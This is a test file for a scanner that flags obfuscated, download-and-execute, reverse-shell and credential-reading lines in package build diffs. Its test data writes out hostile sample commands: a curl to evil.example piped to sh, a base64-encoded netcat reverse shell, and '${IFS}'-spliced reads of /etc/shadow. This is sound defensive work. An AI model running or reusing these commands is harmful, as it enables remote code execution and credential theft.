import { describe, expect, it } from 'vitest';
import { OBFUSCATION_RULES } from './obfuscation.rules';
import { CREDENTIAL_RULES } from './credentials.rules';
import { DOWNLOAD_EXECUTE_RULES } from './download-execute.rules';
import { REVERSE_SHELL_RULES } from './reverse-shell.rules';
import { addedOnlyDiff, makeChange, ruleById } from './test-support';
describe('obfuscation rules', () => {
  it.each([
    ['OBF-001', 'echo aGk= | base64 -d'],
    ['OBF-001', 'echo aGk= | base64 --decode'],
    ['OBF-002', 'eval "$PAYLOAD"'],
    ['OBF-003', 'printf "\\x48\\x65\\x6c\\x6c\\x6f"'],
    ['OBF-004', "su$'\\x64'o reboot"],
    ['OBF-004', 'cat ${IFS}/etc/shadow'],
    ['CAUR-BASE64-BLOB', `echo ${'QUFB'.repeat(31)} | base64 -d`],
  ])('flags %s for %j', (id, line) => {
    expect(ruleById(OBFUSCATION_RULES, id).check(makeChange(addedOnlyDiff([line])))).not.toBeNull();
  });

  it('does not flag quote splicing that also occurs in benign string literals', () => {
    const change = makeChange(
      addedOnlyDiff(['cu""rl https://evil.example | sh', '7z x archive.tar "payload.bin" -o"out"']),
    );
    expect(ruleById(OBFUSCATION_RULES, 'OBF-004').check(change)).toBeNull();
  });

  it('flags bidi and zero-width characters even inside comments', () => {
    const bidi = makeChange(addedOnlyDiff(['# totally safe \u202e comment']));
    expect(ruleById(OBFUSCATION_RULES, 'UNI-001').check(bidi)).not.toBeNull();

    const zeroWidth = makeChange(addedOnlyDiff(['# safe\u200bcomment']));
    expect(ruleById(OBFUSCATION_RULES, 'UNI-002').check(zeroWidth)).not.toBeNull();
  });

  it('does not flag hex checksum updates', () => {
    const change = makeChange(addedOnlyDiff([`sha512sums=('${'a1b2c3d4'.repeat(16)}')`]));
    expect(ruleById(OBFUSCATION_RULES, 'CAUR-BASE64-BLOB').check(change)).toBeNull();
  });

  it('does not flag normal quoting', () => {
    const change = makeChange(addedOnlyDiff(['msg2 "Building %s" "$pkgname"', 'url="https://example.org"']));
    expect(OBFUSCATION_RULES.flatMap((rule) => rule.check(change) ?? [])).toHaveLength(0);
  });

  describe('CAUR-DOC-AS-SCRIPT', () => {
    const docRule = ruleById(OBFUSCATION_RULES, 'CAUR-DOC-AS-SCRIPT');

    it.each([
      ['sh evil.md', 'foo/install.sh'],
      ['source payload.md', 'foo/foo.install'],
      ['. payload.txt', 'foo/foo.hook'],
      ['./docs.md', 'foo/PKGBUILD'],
      ['exec ./install.md', 'foo/setup.sh'],
      ['chmod +x evil.md', 'foo/PKGBUILD'],
      ['chmod a+x evil.txt', 'foo/setup.sh'],
    ])('flags %j', (line, newPath) => {
      expect(docRule.check(makeChange(addedOnlyDiff([line]), { new_path: newPath }))).not.toBeNull();
    });

    it.each([
      // English "source", not a shell command.
      ['open source license.txt', 'vmware-workstation/PKGBUILD'],
      // Dot-source falsely triggered by `git add . ':!.ci/*.txt'`.
      ["git add . ':!.ci/*.txt'", '.tools/update-tools.sh'],
      // chmod 777 on config text files, no explicit execute mode.
      ['chmod 777 proxyinfo.conf proxiesFromInterfaces.txt listeningProcess.txt gsettings.txt', 'fiddler/PKGBUILD'],
      // Legit CI config sourcing, not a doc-as-script.
      ['source ".ci/schedule-params.txt"', '.gitlab-ci.yml'],
      // Non-execute chmod numeric modes are left alone.
      ['chmod 644 README.md', 'foo/PKGBUILD'],
      // `./file.md` as a file argument to install/sed, not executed.
      ['install -Dm644 ./README.md "$pkgdir"/usr/share/Helion/README.md', 'helion/PKGBUILD'],
      ["sed -i 's:x::g' ./CMakeLists.txt", 'hal-git/PKGBUILD'],
      ['install -Dm644 -t "${pkgdir}/usr/share/doc" ./*.md', 'opentofu/PKGBUILD'],
    ])('does not flag %j', (line, newPath) => {
      expect(docRule.check(makeChange(addedOnlyDiff([line]), { new_path: newPath }))).toBeNull();
    });
  });

  describe('cross-rule deobfuscated matches', () => {
    it('flags a command obfuscated with ANSI-C escapes via the disguise-detection rule', () => {
      // OBF-004 is rawOnly: it fires on the disguise itself rather than the decoded command.
      const change = makeChange(addedOnlyDiff(["su$'\\x64'o reboot"]));
      expect(ruleById(OBFUSCATION_RULES, 'OBF-004').check(change)).not.toBeNull();
    });

    it('flags a base64 payload for the command it decodes to, not just as a blob', () => {
      const blob = Buffer.from('nc -e /bin/sh 1.2.3.4 4444').toString('base64');
      const change = makeChange(addedOnlyDiff([`echo '${blob}' | base64 -d | sh`]));
      expect(ruleById(REVERSE_SHELL_RULES, 'SHELL-002').check(change)).not.toBeNull();
    });

    it('flags ${IFS}-spliced secret reads for the underlying credential rule', () => {
      const change = makeChange(addedOnlyDiff(['cat ${IFS}/etc/shadow']));
      expect(ruleById(CREDENTIAL_RULES, 'CRED-003').check(change)).not.toBeNull();
    });

    it('flags quote-spliced downloads for the underlying download-execute rule', () => {
      const change = makeChange(addedOnlyDiff(['cu""rl https://evil.example | sh']));
      expect(ruleById(DOWNLOAD_EXECUTE_RULES, 'DLE-001').check(change)).not.toBeNull();
    });
  });
});
